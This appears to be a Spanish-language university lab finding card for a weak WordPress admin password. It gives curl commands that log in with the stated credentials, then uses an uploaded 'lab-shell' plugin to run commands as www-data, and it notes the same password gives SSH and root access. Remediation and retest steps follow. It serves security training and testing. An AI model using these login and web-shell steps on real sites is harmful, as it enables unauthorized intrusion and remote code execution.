# W4 · WordPress admin débil

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M1 `10.10.10.11` |
| Servicio | `wp-login.php` |
| Credenciales | `usc.admin` / `Admin13.-` |
| CWE | CWE-521 |
| CVSS | ~8.8 ambiental |
| NVD | Sin CVE (configuración) |
| Estado | **Validada** (302 + cookie) |

## 2. Precondiciones

- WordPress 7.0.1 con el usuario `usc.admin`.
- Clave débil y sin 2FA/límite de intentos.
- Plugin upload habilitado (`DISALLOW_FILE_MODS` no está definido).

## 3. Flujo

1. Snapshot M1: `previo-a-W4`.
2. Login por terminal:

```bash
curl -s -c /tmp/wp.cookies http://wp.uni.lab/wp-login.php -o /dev/null
curl -s -b /tmp/wp.cookies -c /tmp/wp.cookies -D - -o /dev/null \
  -d 'log=usc.admin&pwd=Admin13.-&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwp.uni.lab%2Fwp-admin%2F&testcookie=1' \
  http://wp.uni.lab/wp-login.php | grep -Ei 'HTTP/|Location:|Set-Cookie: wordpress_logged_in'
```

3. Subir el plugin `lab-shell.zip` desde `Plugins → Añadir nuevo → Subir`.
4. Ejecutar:

```bash
curl -s 'http://wp.uni.lab/wp-content/plugins/lab-shell/lab-shell.php?c=id'
```

## 4. Resultado esperado

```text
HTTP/1.1 302 Found
Location: http://wp.uni.lab/wp-admin/
...
uid=33(www-data)
```

## 5. Evidencia

- `EV-W4-01`: 302 + cookie.
- `EV-W4-02`: plugin activo.
- `EV-W4-03`: `id`.
- `LOG-W4`.

## 6. Impacto y siguiente salto

- Admin del CMS → plugin → RCE `www-data`.
- La misma clave abre SSH (`M1-SSH`) → root.

## 7. Fallback

- Si el login falla, probar el slug `usc-admin`.
- Si el plugin no sube, usar W1 o el editor de temas (si está habilitado).

## 8. Remediación

- Clave fuerte y única.
- 2FA + límite de intentos.
- Eliminar el plugin `lab-shell`.
- No reutilizar la clave en SSH.

## 9. Retest

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -d 'log=usc.admin&pwd=Admin13.-&wp-submit=Log+In&testcookie=1' \
  http://wp.uni.lab/wp-login.php
```

Esperado: no `302` (falla o 2FA).

## 10. EARS

- **REQ-W4-01 (Evento).** CUANDO se valide W4, el laboratorio DEBE capturar el 302 + cookie y el `id` del plugin.
- **REQ-W4-02 (Ubicuo).** La remediación DEBE invalidar la clave vieja y eliminar el plugin.

## 11. Checklist

- [ ] Snapshot `previo-a-W4`.
- [ ] Login 302.
- [ ] Plugin + `id`.
- [ ] Evidencia.
- [ ] Remediación.
- [ ] Retest.
